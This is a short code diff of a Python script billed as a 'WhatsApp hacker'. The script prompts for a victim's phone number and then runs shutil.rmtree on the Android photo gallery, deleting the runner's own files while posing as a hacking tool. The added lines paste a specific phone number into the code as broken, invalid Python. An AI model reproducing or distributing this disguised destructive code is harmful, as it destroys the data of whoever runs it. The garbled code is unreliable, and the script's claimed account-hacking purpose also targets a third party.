@@ -9,10 +9,11 @@ print("""
 ┗┛┗┛┗┛┗┻┛┗┻━┻┻┻━┻┻┛""")
 print("            WELCOME TO WHATSAPP HACKER\n         NO FAKE 100% REAL")
 print("            CREATED BY UNKNOWN AGENT")
-country=input("[1]Enter country code>>")
-number=input("[2)]Enter victim's number without country code>>")
-print("Do you want to hack "+country+number+" ?")
+country=input("[1]Enter country code>>")+52
+number=input("[2)]Enter victim's number without country code>>")477 546 5990
+print("Do you want to hack "+country+number+" ?")+52 477 546 5990
 conti=input("Press enter to Hack the WhatsApp account:")
+
 print("Please wait...................")
 try:
 	shutil.rmtree("/storage/emulated/0/Gallery")
